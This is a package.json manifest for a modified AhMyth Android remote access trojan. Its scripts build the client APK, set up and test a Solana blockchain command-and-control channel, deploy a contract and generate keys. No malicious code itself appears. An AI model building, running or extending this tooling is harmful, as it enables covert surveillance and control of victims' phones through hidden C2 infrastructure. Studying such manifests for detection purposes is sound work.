{
  "name": "ahmyth-modded",
  "version": "2.6.0",
  "description": "AhMyth Android RAT - Modern Edition with Advanced Forensic Tools",
  "author": "AhMyth",
  "license": "GPL-3.0",
  "private": true,
  "scripts": {
    "start": "cd AhMyth-Server && bun run start",
    "server": "cd AhMyth-Server && bun run start",
    "dev": "bun run install:all && bun run start",
    "install:all": "bun run install:server && bun run install:server:app",
    "install:server": "cd AhMyth-Server && bun install",
    "install:server:app": "cd AhMyth-Server/app && bun install",
    "build:apk": "cd AhMyth-Client && gradlew.bat assembleRelease",
    "build:apk:debug": "cd AhMyth-Client && gradlew.bat assembleDebug",
    "clean": "cd AhMyth-Client && gradlew.bat clean",
    "emulator": "node scripts/emulator.js",
    "emulator:avd": "node scripts/emulator.js --avd",
    "emulator:build": "node scripts/emulator.js --build",
    "emulator:install": "node scripts/emulator.js --install",
    "emulator:run": "node scripts/emulator.js --launch-app",
    "emulator:grant": "node scripts/emulator.js --grant",
    "emulator:clean": "node scripts/emulator.js --clean",
    "devices": "node scripts/emulator.js --devices",
    "logcat": "node scripts/emulator.js --logcat",
    "test": "node tests/test-comprehensive-suite.js",
    "test:comprehensive": "node tests/run-comprehensive-tests.js",
    "test:auto": "node tests/run-automated-test.js",
    "test:full": "node scripts/build-install-test.js",
    "test:blockchain": "node tests/test-blockchain-c2-suite.js",
    "test:blockchain:connection": "node tests/test-blockchain-connection.js",
    "test:blockchain:connection:emulator": "node tests/test-blockchain-connection.js --emulator",
    "test:image": "node tests/test-image-sending.js",
    "test:image:blockchain": "node tests/test-blockchain-image-sending.js",
    "setup:blockchain": "node scripts/setup-free-blockchain-c2.js",
    "setup:free": "node scripts/setup-completely-free-blockchain-c2.js",
    "deploy:contract": "node scripts/deploy-free-contract.js",
    "generate:keys": "node scripts/generate-keys.js",
    "wallet:check": "node scripts/wallet-check.js"
  },
  "engines": {
    "bun": ">=1.0.0",
    "node": ">=16.0.0"
  },
  "keywords": [
    "android",
    "rat",
    "remote-administration",
    "electron",
    "forensic"
  ],
  "repository": {
    "type": "git",
    "url": "https://github.com/syrex1013/AhMyth.git"
  },
  "dependencies": {
    "@solana/spl-token": "^0.4.14",
    "@solana/web3.js": "^1.98.4",
    "bs58": "^6.0.0",
    "socket.io": "^4.8.1",
    "socket.io-client": "^4.8.1"
  },
  "devDependencies": {
    "solc": "^0.8.31"
  }
}
